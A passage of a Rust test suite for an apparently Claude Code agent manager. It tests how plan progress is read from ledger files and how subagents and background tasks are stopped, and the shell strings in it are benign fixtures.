    assert_eq!(plan.agents[0].status, crate::plan::RunStatus::Interrupted);
    assert_eq!(plan.agents[0].doing, None);
    assert_eq!(
        plan.workflows[0].status,
        crate::plan::RunStatus::Interrupted
    );
    assert_eq!(plan.launched, 1);
    // The window gets it with the agent, in its own words.
    let sent = serde_json::to_value(core.agent("busy").unwrap().lock().view()).unwrap();
    assert_eq!(sent["plan"]["agents"][0]["status"], "interrupted");
    assert_eq!(sent["plan"]["agents"][0]["planTask"], "1");
}

// ---------- the plan of the agent's folder ----------

/// A plan of three tasks and the workspace of its execution, as the superpowers scripts leave
/// them in `repo`; the ledger's path.
fn plan_workspace(repo: &Path) -> PathBuf {
    let plans = repo.join("docs").join("superpowers").join("plans");
    std::fs::create_dir_all(&plans).unwrap();
    std::fs::write(
        plans.join("demo.md"),
        "# Démo Implementation Plan\n\n### Task 1: Un\n\n- [ ] a\n\n### Task 2: Deux\n\n- [ ] b\n\n### Task 3: Trois\n\n- [ ] c\n",
    )
    .unwrap();
    let space = repo.join(".superpowers").join("sdd").join("demo");
    std::fs::create_dir_all(&space).unwrap();
    std::fs::write(space.join("plan-path"), "docs/superpowers/plans/demo.md\n").unwrap();
    let ledger = space.join("progress.md");
    std::fs::write(
        &ledger,
        "# SDD ledger — plan: docs/superpowers/plans/demo.md\n",
    )
    .unwrap();
    ledger
}

fn append(path: &Path, text: &str) {
    use std::io::Write;
    std::fs::OpenOptions::new()
        .append(true)
        .open(path)
        .unwrap()
        .write_all(text.as_bytes())
        .unwrap();
}

impl Harness {
    /// A frame of the agent's process, as `claude` writes it.
    pub(crate) fn feed(&self, id: &str, frame: Value) {
        let agent = self.core.agent(id).unwrap();
        let gen = agent.lock().gen;
        self.core.on_frame(&agent, gen, frame);
    }

    /// The main thread runs a command, which has ended.
    fn command(&self, id: &str, call: &str, command: &str) {
        self.feed(
            id,
            json!({"type":"assistant","message":{"id":format!("m-{call}"),"content":[{"type":"tool_use","id":call,"name":"Bash","input":{"command":command}}]},"parent_tool_use_id":null}),
        );
        self.feed(
            id,
            json!({"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":call,"content":"ok"}]},"parent_tool_use_id":null}),
        );
    }

    fn plan_statuses(&self, id: &str) -> Vec<(String, crate::plan::TaskStatus)> {
        self.agent(id)
            .plan
            .map(|p| p.tasks.into_iter().map(|t| (t.id, t.status)).collect())
            .unwrap_or_default()
    }

    /// Times the files of a plan were read.
    fn plan_reads(&self) -> usize {
        self.core.plan_reads.load(Ordering::Acquire)
    }

    /// Looks at the files of a plan that ended, whatever they found.
    fn plan_looks(&self) -> usize {
        self.core.plan_looks.load(Ordering::Acquire)
    }

    /// The look that the end of the first turn asks for is over, and the least time between two
    /// is none: what follows is not held back by it.
    async fn plan_looks_at_once(&self) {
        self.wait("the look of the first turn", |h| h.plan_looks() >= 1)
            .await;
        self.core.plan_scan_ms.store(0, Ordering::Release);
    }
}

/// An agent that has had its first turn (so its conversation has begun), in a repository.
async fn plan_agent(name: &str) -> (Harness, String, PathBuf) {
    let h = harness(name);
    let (p, repo) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.plan_looks_at_once().await;
    (h, id, repo)
}

#[tokio::test]
async fn a_command_that_wrote_the_ledger_moves_the_plan_without_any_other_event() {
    use crate::plan::TaskStatus::{Done, InProgress, Pending};
    let (h, id, repo) = plan_agent("p2-ledger").await;
    assert!(h.agent(&id).plan.is_none());
    let ledger = plan_workspace(&repo);
    // The script that made the workspace has ended: the plan is there, nothing done.
    h.command(&id, "b1", "sdd-workspace docs/superpowers/plans/demo.md");
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(crate::plan::PlanSource::Plan));
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(
        plan.plan_file.as_deref(),
        Some("docs/superpowers/plans/demo.md")
    );
    assert!(h
        .plan_statuses(&id)
        .iter()
        .all(|(_, status)| *status == Pending));

    // `task-done` appends its line; the command ends. No other event: the next look sees it.
    append(
        &ledger,
        "Task 1: complete (commits a..b, tests: npm test → ok)\n",
    );
    h.command(
        &id,
        "b2",
        "task-done docs/superpowers/plans/demo.md 1 abc -- npm test",
    );
    h.wait("task 1 done", |h| {
        h.plan_statuses(&id).first().map(|(_, s)| *s) == Some(Done)
    })
    .await;
    // The window got it, in its own words.
    let sent = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .cloned()
        .unwrap();
    assert_eq!(sent["agent"]["plan"]["source"], "plan");
    assert_eq!(sent["agent"]["plan"]["tasks"][0]["status"], "done");
    assert_eq!(
        sent["agent"]["plan"]["planFile"],
        "docs/superpowers/plans/demo.md"
    );

    // The next task's brief is written: it is under way.
    std::fs::write(
        repo.join(".superpowers/sdd/demo/task-2-brief.md"),
        "### Task 2: Deux\n",
    )
    .unwrap();
    h.command(&id, "b3", "task-start docs/superpowers/plans/demo.md 2");
    h.wait("task 2 under way", |h| {
        h.plan_statuses(&id)
            == [
                ("1".into(), Done),
                ("2".into(), InProgress),
                ("3".into(), Pending),
            ]
    })
    .await;
    // And what the agent saved says so: the plan is part of its state.
    assert!(h.core.agent(&id).unwrap().lock().meta.plan.is_some());
}

#[tokio::test]
async fn the_plans_name_stays_with_the_agents_own_list_while_the_files_do_not_move() {
    let (h, id, repo) = plan_agent("p4-own-list").await;
    plan_workspace(&repo);
    h.command(&id, "b1", "sdd-workspace docs/superpowers/plans/demo.md");
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    assert_eq!(
        h.agent(&id).plan.unwrap().source,
        Some(crate::plan::PlanSource::Plan)
    );
    // The agent lists a task of its own (one of the plan's): its list is the list now.
    h.feed(
        &id,
        json!({"type":"assistant","message":{"id":"m-c1","content":[{"type":"tool_use","id":"c1","name":"TaskCreate","input":{"subject":"Task 1: Un"}}]},"parent_tool_use_id":null}),
    );
    h.feed(
        &id,
        json!({"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"c1","content":"Task #1 created successfully: Task 1: Un"}]},"parent_tool_use_id":null}),
    );
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(crate::plan::PlanSource::Tools));
    assert_eq!(plan.tasks.len(), 1);
    // The files do not move, whatever the commands: the look reads nothing and hands nothing
    // over, and the plan keeps its name and title all the same.
    let (reads, looks) = (h.plan_reads(), h.plan_looks());
    h.command(&id, "b2", "echo nothing moved");
    h.wait("a look that finds them as they were", |h| {
        h.plan_looks() > looks
    })
    .await;
    assert_eq!(h.plan_reads(), reads);
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(
        plan.plan_file.as_deref(),
        Some("docs/superpowers/plans/demo.md")
    );
    let sent = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .cloned()
        .unwrap();
    assert_eq!(sent["agent"]["plan"]["title"], "Démo");
}

#[tokio::test]
async fn the_agent_removing_the_workspace_of_its_plan_ends_the_run_and_the_plan_stays_done() {
    use crate::plan::TaskStatus::{Done, InProgress, Pending};
    let (h, id, repo) = plan_agent("p4-workspace-removed").await;
    let ledger = plan_workspace(&repo);
    append(&ledger, "Task 1: complete (x)\n");
    h.command(&id, "b1", "echo ledger");
    h.wait("task 1 done", |h| {
        h.statuses_of(&id) == [Done, Pending, Pending]
    })
    .await;
    std::fs::write(
        repo.join(".superpowers/sdd/demo/task-2-brief.md"),
        "### Task 2: Deux\n",
    )
    .unwrap();
    h.command(&id, "b2", "task-start docs/superpowers/plans/demo.md 2");
    h.wait("task 2 under way", |h| {
        h.statuses_of(&id) == [Done, InProgress, Pending]
    })
    .await;
    // As a real run ended: the last lines of the ledger, and the workspace removed, in one
    // command. No look can see them: the command says it.
    let command = "echo 'Task 2: complete (x)' >> .superpowers/sdd/demo/progress.md; echo 'Task 3: complete (x)' >> .superpowers/sdd/demo/progress.md; rm -rf .superpowers/sdd/demo";
    std::fs::remove_dir_all(repo.join(".superpowers/sdd/demo")).unwrap();
    h.command(&id, "b3", command);
    h.wait("the plan done", |h| {
        h.statuses_of(&id) == [Done, Done, Done]
    })
    .await;
    // The looks that follow find nothing, and say nothing: it stays as it ended.
    let looks = h.plan_looks();
    h.command(&id, "b4", "git status");
    h.wait("a look after", |h| h.plan_looks() > looks).await;
    assert_eq!(h.statuses_of(&id), [Done, Done, Done]);
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(crate::plan::PlanSource::Plan));
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert!(plan.is_finished());
}

#[tokio::test]
async fn the_end_of_a_turn_looks_at_the_files_too() {
    let (h, id, repo) = plan_agent("p2-turn-end").await;
    let ledger = plan_workspace(&repo);
    append(
        &ledger,
        "Task 1: complete (x)\nTask 2: dispatched (sonnet)\n",
    );
    // Nothing ran a command: the turn ends, and that is the look.
    h.feed(
        &id,
        json!({"type":"result","subtype":"success","is_error":false,"duration_ms":1,"result":"ok"}),
    );
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    let statuses = h.plan_statuses(&id);
    assert_eq!(statuses[0].1, crate::plan::TaskStatus::Done);
    assert_eq!(statuses[1].1, crate::plan::TaskStatus::InProgress);
}

#[tokio::test]
async fn the_files_are_read_once_per_interval_however_many_commands_end() {
    let (h, id, repo) = plan_agent("p2-throttle").await;
    let ledger = plan_workspace(&repo);
    h.core.plan_scan_ms.store(1200, Ordering::Release);
    // (The first look waits for the interval, counted from the look the end of the turn made.)
    h.command(&id, "b0", "sdd-workspace docs/superpowers/plans/demo.md");
    h.wait("the first look", |h| h.plan_looks() == 2).await;
    assert_eq!(h.plan_reads(), 1);
    // A burst of commands, each of which moved the ledger.
    for n in 1..=6 {
        append(&ledger, &format!("Task {n}: review dispatched\n"));
        h.command(&id, &format!("b{n}"), "echo ledger");
    }
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(
        (h.plan_looks(), h.plan_reads()),
        (2, 1),
        "not again within the interval"
    );
    // One look follows, and it sees all of the burst.
    h.wait("the look that was owed", |h| h.plan_looks() == 3)
        .await;
    assert_eq!(h.plan_reads(), 2);
    assert!(h
        .plan_statuses(&id)
        .iter()
        .all(|(_, s)| *s == crate::plan::TaskStatus::InProgress));
    // Nothing moved since: the look after that reads nothing, and nothing more is owed.
    h.command(&id, "late", "echo nothing");
    h.wait("the look after", |h| h.plan_looks() == 4).await;
    assert_eq!(h.plan_reads(), 2);
    tokio::time::sleep(Duration::from_millis(1500)).await;
    assert_eq!(h.plan_looks(), 4);
}

#[tokio::test]
async fn a_plan_untouched_since_the_conversation_began_is_not_the_agents() {
    let h = harness("p2-stale");
    let (p, repo) = h.project(false).await;
    // A workspace left by someone else, an hour ago.
    let ledger = plan_workspace(&repo);
    append(&ledger, "Task 1: complete (x)\n");
    let hour_ago = std::time::SystemTime::now() - Duration::from_secs(3600);
    std::fs::File::options()
        .write(true)
        .open(&ledger)
        .unwrap()
        .set_modified(hour_ago)
        .unwrap();
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.plan_looks_at_once().await;
    h.command(&id, "b1", "ls");
    h.feed(
        &id,
        json!({"type":"result","subtype":"success","is_error":false,"duration_ms":1}),
    );
    h.wait("looks", |h| h.plan_looks() >= 2).await;
    assert_eq!(h.plan_reads(), 0);
    assert!(h.agent(&id).plan.is_none(), "an old plan of the folder");
    // The agent works on it: it is its own now.
    append(&ledger, "Task 2: dispatched (sonnet)\n");
    h.command(&id, "b2", "echo ledger");
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    assert_eq!(h.plan_statuses(&id)[0].1, crate::plan::TaskStatus::Done);
}

#[tokio::test]
async fn a_plan_written_through_another_name_of_the_agents_folder_is_found_in_the_repository() {
    let (h, id, repo) = plan_agent("p2-alias").await;
    plan_workspace(&repo);
    std::fs::remove_dir_all(repo.join(".superpowers")).unwrap();
    // The agent's folder is spelled through a link (a short Windows name, a symlinked project):
    // the paths its tools use are spelled the same, git says where the repository really is.
    let alias = repo.parent().unwrap().join("alias");
    if !crate::paths::make_dir_link(&repo, &alias) {
        eprintln!("no link to a folder here: skipped");
        return;
    }
    h.core.agent(&id).unwrap().lock().meta.cwd = alias.to_string_lossy().into_owned();
    let plan = alias
        .join("docs")
        .join("superpowers")
        .join("plans")
        .join("demo.md");
    h.feed(
        &id,
        json!({"type":"assistant","message":{"id":"m-w1","content":[{"type":"tool_use","id":"w1","name":"Write","input":{"file_path":plan.to_string_lossy(),"content":"x"}}]},"parent_tool_use_id":null}),
    );
    h.feed(
        &id,
        json!({"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"w1","content":"ok"}]},"parent_tool_use_id":null}),
    );
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    assert_eq!(h.agent(&id).plan.unwrap().title.as_deref(), Some("Démo"));
}

#[tokio::test]
async fn a_plan_the_agent_wrote_is_shown_without_a_ledger_and_the_ones_outside_are_not_read() {
    let (h, id, repo) = plan_agent("p2-written").await;
    plan_workspace(&repo);
    std::fs::remove_dir_all(repo.join(".superpowers")).unwrap();
    let plan = repo.join("docs/superpowers/plans/demo.md");
    let outside = repo.parent().unwrap().join("outside.md");
    std::fs::write(&outside, "# Dehors\n\n### Task 1: Secret\n").unwrap();
    for (call, path) in [("w0", outside.clone()), ("w1", plan.clone())] {
        h.feed(
            &id,
            json!({"type":"assistant","message":{"id":format!("m-{call}"),"content":[{"type":"tool_use","id":call,"name":"Write","input":{"file_path":path.to_string_lossy(),"content":"x"}}]},"parent_tool_use_id":null}),
        );
        h.feed(
            &id,
            json!({"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":call,"content":"ok"}]},"parent_tool_use_id":null}),
        );
    }
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert!(plan.tasks.iter().all(|t| t.title != "Secret"));
    assert!(plan
        .tasks
        .iter()
        .all(|t| t.status == crate::plan::TaskStatus::Pending));
}

#[tokio::test]
async fn a_plan_written_by_a_command_is_shown_without_a_ledger_like_one_written_by_a_tool() {
    // How a real run of the skills wrote its plan, and then ran it without a workspace.
    let (h, id, repo) = plan_agent("p4-written-by-command").await;
    plan_workspace(&repo);
    std::fs::remove_dir_all(repo.join(".superpowers")).unwrap();
    h.command(
        &id,
        "b1",
        "mkdir -p docs/superpowers/plans && cat > docs/superpowers/plans/demo.md <<'EOF'
# Démo Implementation Plan
EOF
git add docs/superpowers/plans/demo.md",
    );
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(crate::plan::PlanSource::Plan));
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert!(plan
        .tasks
        .iter()
        .all(|t| t.status == crate::plan::TaskStatus::Pending));
}

#[tokio::test]
async fn an_old_plan_a_command_only_reads_does_not_replace_the_one_the_agent_wrote() {
    let (h, id, repo) = plan_agent("p4-stale-read").await;
    plan_workspace(&repo);
    std::fs::remove_dir_all(repo.join(".superpowers")).unwrap();
    // An old plan of the repository, from before the conversation: not the agent's.
    let old = repo.join("docs/superpowers/plans/old.md");
    std::fs::write(&old, "# Ancien Implementation Plan\n\n### Task 1: Vieux\n").unwrap();
    std::fs::File::options()
        .write(true)
        .open(&old)
        .unwrap()
        .set_modified(std::time::SystemTime::now() - Duration::from_secs(3600))
        .unwrap();
    // It writes its plan, then reads, searches and logs the old one (five mentions or one).
    h.command(
        &id,
        "b1",
        "cat > docs/superpowers/plans/demo.md <<'EOF'\n# Démo Implementation Plan\nEOF",
    );
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    for (n, command) in [
        "cat docs/superpowers/plans/old.md",
        "grep -n Task docs/superpowers/plans/old.md",
        "git log --oneline -- docs/superpowers/plans/old.md",
        "wc -l docs/superpowers/plans/old.md",
        "git add docs/superpowers/plans/old.md",
        "head -3 docs/superpowers/plans/old.md",
    ]
    .iter()
    .enumerate()
    {
        let looks = h.plan_looks();
        h.command(&id, &format!("r{n}"), command);
        h.wait("a look", |h| h.plan_looks() > looks).await;
    }
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(plan.tasks.len(), 3);
    assert!(plan.tasks.iter().all(|t| t.title != "Vieux"));
}

#[tokio::test]
async fn a_plan_that_cannot_be_read_any_more_is_no_notice_and_leaves_the_last_state() {
    let (h, id, repo) = plan_agent("p2-unreadable").await;
    let ledger = plan_workspace(&repo);
    append(&ledger, "Task 1: complete (x)\n");
    h.command(&id, "b1", "echo ledger");
    h.wait("the plan", |h| h.plan_statuses(&id).len() == 3)
        .await;
    let notices = || {
        h.items(&id)
            .iter()
            .filter(|i| i["kind"] == "notice")
            .count()
    };
    let before = notices();
    // The plan is deleted, then the whole workspace; commands end.
    std::fs::remove_file(repo.join("docs/superpowers/plans/demo.md")).unwrap();
    append(&ledger, "Task 2: complete (x)\n");
    let looks = h.plan_looks();
    h.command(&id, "b2", "echo gone");
    h.wait("a look at the plan gone", |h| h.plan_looks() > looks)
        .await;
    std::fs::remove_dir_all(repo.join(".superpowers")).unwrap();
    let looks = h.plan_looks();
    h.command(&id, "b3", "echo gone");
    h.wait("a look at the workspace gone", |h| h.plan_looks() > looks)
        .await;
    assert_eq!(h.plan_statuses(&id).len(), 3);
    assert_eq!(h.plan_statuses(&id)[0].1, crate::plan::TaskStatus::Done);
    assert_eq!(notices(), before, "no notice, no toast");
    assert!(h.agent(&id).status != AgentStatus::Error);
}

#[tokio::test]
async fn an_agent_saved_with_the_plan_of_a_file_gets_it_back() {
    let dir = test_dir("p2-old-plan");
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    std::fs::write(data.settings_file(), r#"{"claudePath":"","sound":false}"#).unwrap();
    // As the app writes it (the window's shape), and as an earlier 1.7 build wrote a plan:
    // without a plan file or a title.
    let agent = |id: &str, plan: Value| {
        json!({ "id": id, "projectId": "p1", "name": id, "model": "sonnet", "effort": "medium",
                "mode": "auto", "cwd": dir.to_string_lossy(), "plan": plan })
    };
    std::fs::write(
        data.state_file(),
        json!({ "projects": [], "agents": [
            agent("from-file", json!({ "source": "plan", "planFile": "docs/superpowers/plans/demo.md",
                "title": "Démo", "tasks": [
                    { "id": "1", "title": "Un", "status": "done" },
                    { "id": "2", "title": "Deux", "status": "inProgress", "steps": [1, 3] }] })),
            agent("older", json!({ "source": "tools", "tasks": [{ "id": "1", "title": "Lire", "status": "pending" }] })),
        ] })
        .to_string(),
    )
    .unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    let plan = core
        .agent("from-file")
        .unwrap()
        .lock()
        .view()
        .meta
        .plan
        .unwrap();
    assert_eq!(plan.source, Some(crate::plan::PlanSource::Plan));
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(plan.tasks[1].steps, Some((1, 3)));
    let older = core
        .agent("older")
        .unwrap()
        .lock()
        .view()
        .meta
        .plan
        .unwrap();
    assert_eq!((older.title, older.plan_file), (None, None));
}

// ---------- a plan run, as the fake claude plays it ("plan superpowers") ----------

impl Harness {
    /// The plan of every `agent` event the window got for `id`, oldest first.
    fn plans_sent(&self, id: &str) -> Vec<Value> {
        self.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "agent" && e["agent"]["id"] == id)
            .filter_map(|e| e["agent"].get("plan").cloned())
            .collect()
    }

    /// The agent asks its question (the third task waits on it): it is told to take SQLite.
    async fn answer_the_question(&self, id: &str) {
        self.wait("the question", |h| {
            h.agent(id).status == AgentStatus::Waiting
        })
        .await;
        self.core
            .answer_question(
                id,
                "req_question",
                json!({"Quelle base de données ?": "SQLite"}),
            )
            .unwrap();
    }

    /// The turn that began has ended.
    async fn end_of_the_run(&self, id: &str) {
        self.wait("the end of the turn", |h| {
            h.items(id).iter().any(|i| i["kind"] == "turn") && !h.agent(id).status.is_active()
        })
        .await;
    }

    fn statuses_of(&self, id: &str) -> Vec<crate::plan::TaskStatus> {
        self.plan_statuses(id).into_iter().map(|(_, s)| s).collect()
    }
}

/// The index of the first plan sent that `holds`.
fn first_plan(sent: &[Value], holds: impl Fn(&Value) -> bool) -> Option<usize> {
    sent.iter().position(holds)
}

fn has_task_status(plan: &Value, n: usize, status: &str) -> bool {
    plan["tasks"][n]["status"] == status
}

fn has_agent(plan: &Value, holds: impl Fn(&Value) -> bool) -> bool {
    plan["agents"]
        .as_array()
        .is_some_and(|a| a.iter().any(holds))
}

#[tokio::test]
async fn arreter_stops_a_subagent_by_stop_task_on_its_task_and_its_request_is_answered_in_its_view()
{
    use crate::plan::RunStatus;
    let h = harness("esc13-stop-subagent");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "sous-agent long".into(), vec![])
        .await
        .unwrap();
    // It asks for a permission from its thread: the request is its own.
    h.wait("the subagent's request", |h| {
        h.agent(&id).status == AgentStatus::Waiting
    })
    .await;
    let row = h.agent(&id).plan.unwrap().agents[0].clone();
    assert_eq!(row.status, RunStatus::Running);
    assert_eq!(row.task_id.as_deref(), Some("fakelong-agent"));
    let request = h
        .items(&id)
        .into_iter()
        .find(|i| i["kind"] == "permission")
        .unwrap();
    assert_eq!(request["sub"], row.id.as_str());
    h.core
        .answer_permission(&id, "req_subperm", "allow", None)
        .unwrap();
    h.wait("its thread going on", |h| {
        h.items(&id).iter().any(|i| {
            i["parent"] == row.id.as_str()
                && i["text"] == "Le serveur répond, je continue de surveiller."
        })
    })
    .await;

    // A subagent the agent does not run, or no longer runs, cannot be stopped; nor one in the
    // foreground (the agent waits for it; stopping one alone there was never tried): nothing is sent.
    let refused = |e: anyhow::Error| e.to_string();
    assert_eq!(
        refused(h.core.stop_subagent(&id, "toolu_nobody").await.unwrap_err()),
        "Ce sous-agent ne tourne plus."
    );
    let background = |h: &Harness, on: bool| {
        let handle = h.core.agent(&id).unwrap();
        handle.lock().meta.plan.as_mut().unwrap().agents[0].background = on;
    };
    background(&h, false);
    assert_eq!(
        refused(h.core.stop_subagent(&id, &row.id).await.unwrap_err()),
        "Ce sous-agent travaille au premier plan : l’agent l’attend, et « Arrêter » de l’agent l’arrête avec son tour."
    );
    background(&h, true);
    h.core.stop_subagent(&id, &row.id).await.unwrap();
    let sent = h.fake_log(&r, "control");
    let stops: Vec<_> = sent
        .iter()
        .filter(|c| c["subtype"] == "stop_task")
        .collect();
    assert_eq!(stops.len(), 1);
    assert_eq!(stops[0]["task_id"], "fakelong-agent");
    h.wait("the subagent stopped", |h| {
        h.agent(&id)
            .plan
            .is_some_and(|p| p.agents[0].status == RunStatus::Stopped)
    })
    .await;
    // What it was is kept with its call.
    let call = h
        .items(&id)
        .into_iter()
        .find(|i| i["id"] == row.id.as_str())
        .unwrap();
    assert_eq!(call["run"]["status"], "stopped");
    assert_eq!(
        refused(h.core.stop_subagent(&id, &row.id).await.unwrap_err()),
        "Ce sous-agent ne tourne plus."
    );
    assert_eq!(
        h.fake_log(&r, "control")
            .iter()
            .filter(|c| c["subtype"] == "stop_task")
            .count(),
        1
    );
}

// ---------- tasks in the background (ESC-14): the fake claude's "commande de fond" ----------

impl Harness {
    pub(crate) fn bg_tasks(&self, id: &str) -> Vec<crate::plan::BgTask> {
        self.agent(id).plan.map(|p| p.bg_tasks).unwrap_or_default()
    }

    /// The row of the task titled `title`, once the plan has it (and its file, if `with_file`).
    pub(crate) async fn bg_task(
        &self,
        id: &str,
        title: &str,
        with_file: bool,
    ) -> crate::plan::BgTask {
        self.wait("the task listed", |h| {
            h.bg_tasks(id)
                .iter()
                .any(|t| t.title == title && (!with_file || t.output_file.is_some()))
        })
        .await;
        self.bg_tasks(id)
            .into_iter()
            .find(|t| t.title == title)
            .unwrap()
    }

    pub(crate) async fn bg_task_status(
        &self,
        id: &str,
        task: &str,
        status: crate::plan::RunStatus,
    ) {
        self.wait("the task's status", |h| {
            h.bg_tasks(id)
                .iter()
                .any(|t| t.id == task && t.status == status)
        })
        .await;
    }
}

/// A plan row of a task nothing launched, with the file its output would be in.
fn bg_row(id: &str, file: Option<&Path>) -> crate::plan::BgTask {
    crate::plan::BgTask {
        id: id.into(),
        title: id.into(),
        output_file: file.map(|f| f.to_string_lossy().to_string()),
        ..Default::default()
    }
}

#[tokio::test]
async fn stop_bg_task_stops_a_command_by_stop_task_and_its_row_ends_with_the_frames() {
    use crate::plan::{BgKind, RunStatus};
    let h = harness("esc14-stop-command");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", true).await;
    assert_eq!(
        (row.kind, row.status),
        (BgKind::Command, RunStatus::Running)
    );
    assert_eq!(
        row.command.as_deref(),
        Some("for i in $(seq 1 10); do echo tick $i; sleep 2; done")
    );
    assert!(row
        .output_file
        .as_deref()
        .is_some_and(|f| f.ends_with(&format!("{}.output", row.id))));
    // A task the agent does not have, or that is not a task of the plan: nothing is sent.
    let refused = |e: anyhow::Error| e.to_string();
    assert_eq!(
        refused(h.core.stop_bg_task(&id, "nobody").await.unwrap_err()),
        "Cette tâche de fond n’est pas connue de l’agent."
    );
    h.core.stop_bg_task(&id, &row.id).await.unwrap();
    let stops: Vec<_> = h
        .fake_log(&r, "control")
        .into_iter()
        .filter(|c| c["subtype"] == "stop_task")
        .collect();
    assert_eq!(stops.len(), 1);
    assert_eq!(stops[0]["task_id"], row.id.as_str());
    // Its end is the frames': the row was not touched by the command.
    h.bg_task_status(&id, &row.id, RunStatus::Stopped).await;
    // The notification follows the task's update: its words are the description.
    h.wait("its notification", |h| {
        h.bg_tasks(&id)
            .iter()
            .any(|t| t.id == row.id && t.summary.is_some())
    })
    .await;
    let row = h.bg_task(&id, "Ticker", true).await;
    assert_eq!(row.summary.as_deref(), Some("Ticker"));
    assert!(row.ended_at.is_some());
    // Over: refused, and nothing more is sent.
    assert_eq!(
        refused(h.core.stop_bg_task(&id, &row.id).await.unwrap_err()),
        "Cette tâche de fond ne tourne plus."
    );
    assert_eq!(
        h.fake_log(&r, "control")
            .iter()
            .filter(|c| c["subtype"] == "stop_task")
            .count(),
        1
    );
}

#[tokio::test]
async fn stop_bg_task_is_refused_in_the_claude_code_view_without_a_process_and_for_what_is_over() {
    use crate::plan::{RunStatus, WorkflowRun};
    let h = harness("esc14-stop-refused");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", true).await;
    let refused = |e: anyhow::Error| e.to_string();
    let stops = |h: &Harness| {
        h.fake_log(&r, "control")
            .iter()
            .filter(|c| c["subtype"] == "stop_task")
            .count()
    };
    // In the Claude Code view the interface stops it.
    let agent = h.core.agent(&id).unwrap();
    agent.lock().tui = Some(crate::agent::TuiRun::quiet(false));
    assert_eq!(
        refused(h.core.stop_bg_task(&id, &row.id).await.unwrap_err()),
        "En vue Claude Code, une tâche de fond s’arrête depuis son interface."
    );
    agent.lock().tui = None;
    // With no process there is nobody to ask.
    let live = agent.lock().proc.take();
    assert_eq!(
        refused(h.core.stop_bg_task(&id, &row.id).await.unwrap_err()),
        "Le processus de l’agent ne tourne pas."
    );
    agent.lock().proc = live;
    assert_eq!(stops(&h), 0);
    // A workflow of the plan can be stopped too (it is a task of Claude Code's): the request goes,
    // and Claude Code's refusal of a task it does not run is the answer.
    agent
        .lock()
        .meta
        .plan
        .as_mut()
        .unwrap()
        .workflows
        .push(WorkflowRun {
            id: "wf1".into(),
            status: RunStatus::Running,
            ..Default::default()
        });
    let error = format!("{:#}", h.core.stop_bg_task(&id, "wf1").await.unwrap_err());
    assert!(error.contains("No task found with ID: wf1"), "{error}");
    assert_eq!(stops(&h), 1);
    // One that is over is not asked for again; nor is a workflow that is.
    agent.lock().meta.plan.as_mut().unwrap().workflows[0].status = RunStatus::Done;
    assert_eq!(
        refused(h.core.stop_bg_task(&id, "wf1").await.unwrap_err()),
        "Cette tâche de fond ne tourne plus."
    );
    assert_eq!(stops(&h), 1);
}

#[tokio::test]
async fn a_command_that_ends_by_itself_ends_its_row_and_its_output_is_its_file_with_its_exit_line()
{
    use crate::plan::{BgKind, RunStatus};
    for (message, title, kind, words) in [
        (
            "commande de fond 1s",
            "Ticker",
            BgKind::Command,
            "Background command \"Ticker\" completed (exit code 0)",
        ),
        (
            "surveillance de fond 1s",
            "Watch loop output",
            BgKind::Monitor,
            "Monitor \"Watch loop output\" stream ended",
        ),
    ] {
        let h = harness(&format!("esc14-ends-{}", title.replace(' ', "-")));
        let (p, _) = h.project(false).await;
        let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
        h.core
            .send_message(&id, message.into(), vec![])
            .await
            .unwrap();
        let row = h.bg_task(&id, title, true).await;
        assert_eq!(row.kind, kind, "{message}");
        // Its task ends first, its notification (and its words) right after.
        h.wait("its words", |h| {
            h.bg_tasks(&id)
                .iter()
                .any(|t| t.id == row.id && t.summary.is_some())
        })
        .await;
        h.bg_task_status(&id, &row.id, RunStatus::Done).await;
        let row = h.bg_task(&id, title, true).await;
